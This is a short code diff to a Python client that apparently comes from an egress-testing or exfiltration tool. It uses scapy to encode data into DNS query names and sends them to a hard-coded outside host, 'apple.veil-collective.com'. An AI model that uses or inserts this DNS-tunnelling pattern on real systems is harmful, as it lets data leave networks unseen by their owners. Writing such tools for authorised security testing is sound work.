@@ -38,9 +38,10 @@ class Client:
 
             # Craft the packet with scapy
             try:
-                send(IP()/UDP()/DNS(
-                    qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")],
-                    verbose=False))
+                print type(encoded_data + "." + self.remote_server)
+                request_packet = IP(dst="apple.veil-collective.com")/UDP()/DNS(
+                    qd=[DNSQR(qname=encoded_data + "." + self.remote_server, qtype="A")])
+                send(request_packet, iface='eth0')
             except socket.gaierror:
                 pass
             except KeyboardInterrupt:
